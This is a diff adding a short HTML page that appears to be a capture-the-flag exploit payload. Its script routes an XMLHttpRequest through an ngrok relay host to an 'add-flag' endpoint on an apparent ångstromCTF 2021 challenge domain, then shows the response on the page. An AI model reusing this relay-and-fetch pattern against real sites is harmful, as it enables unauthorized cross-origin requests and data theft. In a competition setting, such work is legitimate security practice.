@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<style type="text/css">
+body {
+	color: blue;
+	font-size:20px;
+	font-family:monospace;
+}
+</style>
+<script>
+function reqListener () {
+  document.getElementById('yay').innerHTML=this.responseText;
+  }
+
+  var oReq = new XMLHttpRequest();
+  oReq.addEventListener("load", reqListener);
+  oReq.open("GET","https://bfc8a76a8c6c.ngrok.io/https://wdwaas.2021.chall.actf.co/add-flag")
+  oReq.send();
+</script>
+</head>
+<body>Hello! <div id="yay"></div><br />
+</body>
+</html>
